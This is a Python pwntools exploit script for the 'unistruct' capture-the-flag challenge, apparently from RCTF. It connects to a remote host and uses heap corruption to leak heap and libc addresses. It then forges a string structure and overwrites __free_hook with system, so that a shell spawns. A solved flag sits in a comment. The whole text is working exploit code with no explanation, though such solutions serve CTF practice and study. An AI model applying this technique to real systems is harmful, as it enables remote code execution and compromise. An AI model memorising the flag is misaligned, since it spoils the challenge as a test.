#!/usr/bin/env python3

from pwn import *
import struct

exe = ELF("./unistruct")
libc = ELF("./libc-2.27.so")
#ld = ELF("./ld-2.27.so")

#r = process([exe.path])
# RCTF{un1s7ruCtun1structun111111111structunistruct}
r = remote("124.70.137.88", 40000)
#r = remote("127.0.0.1", 9999)

def sl(data):
    r.sendlineafter(": ", data)

def s(data):
    r.sendafter(": ", data)

def alloc(index, typ, value):
    print("Alloc " + str(index))
    sl("1")
    sl(str(index))
    sl(str(typ))
    sl(str(value))

def edit_half(append, num):
    r.sendlineafter("place: ", str(append))
    r.sendlineafter("New value: ", str(num))


def edit(index, vals, append):
    print("edit " + str(index))
    sl("2")
    sl(str(index))

    for num in vals:
        edit_half(append, num)

def edit_3(index, data):
    sl("2")
    sl(str(index))
    r.sendline(data)

def free(index):
    sl("4")
    sl(str(index))
    return

def payload_to_list(payload):
    i = 0
    edit_list = []

    while i < len(payload):
        edit_list.append(u32(payload[i:i+4]))
        i += 4

    return edit_list

def show(index):
    sl("3")
    sl(str(index))

def edit_string(index, data):
    sl("2")
    sl(str(index))
    r.sendline(data)

def main():
    # Type 1 int
    # Type 2 float
    # Type 3 basic_string
    # Type 4 vector
    
    pause()
    alloc(3, 3, "A"*0x1100)

    for i in range(3):
        alloc(i, 3, b"M"*0x18)

    free(3)
    
    alloc(4, 4, 10)
    
    edit(4, [i for i in range(10)], 0)
    
    r.sendlineafter("place: ", "1")
    r.sendlineafter("value: ", "11")

    r.sendlineafter("place: ", "1")
    r.sendlineafter("value: ", "11")

    r.recvuntil("Old value: ")
    half0 = int(r.recvline().strip())
    print(hex(half0))

    r.sendlineafter("place: ", "1")
    r.sendlineafter("value: ", "11")

    r.recvuntil("Old value: ")
    half1 = int(r.recvline().strip())
    print(hex(half1))

    heap_leak = (half1 << 32) | half0
    log.info("Heap leak @ 0x%x", heap_leak)
    heap_base = heap_leak - 0x10
    main_struct = heap_base + 0x12e80
    log.warn("main struct at @ 0x%x", main_struct)

    for i in range(3):
        edit_half(0, i)
    
    for i in range(8+1):
        edit_half(1, i)

    edit_half(1, main_struct & 0xffffffff)
    edit_half(1, main_struct >> 32)
    edit_half(1, 0xcafebabe)
    
    for i in range(3):
        free(i)
    
    pointer_to_libc = heap_base + 0x13e30

    fake_basic_string = p64(main_struct) + p64(0x4000)*2 + p64(0) + p64(3)
    edit_list = payload_to_list(fake_basic_string) 

    alloc(0, 3, b"A"*0x50)
    
    alloc(7, 4, 10)
    
    edit(7, edit_list, 0)

    r.sendlineafter("place: ", "1")
    r.sendlineafter("New value: ", str(0xcafebabe))

    show(1)
    libc_leak = u64(r.recvuntil(p8(0x7f))[-6::].ljust(8, p8(0)))
    log.info("Libc leak @ 0x%x", libc_leak)

    libc.address = libc_leak - 0x3ebca0
    log.warn("Libc base @ 0x%x", libc.address)

    edit_string(1, p64(libc.sym['__free_hook']-0x8) + p64(0x10)*2 + p64(0) + p64(3))

    edit_string(0, b"/bin/sh\x00" + p64(libc.sym['system']))
    
    r.sendlineafter("Choice: ", "4")
    r.sendlineafter("Index: ", "0")

    r.interactive()



if __name__ == "__main__":
    main()
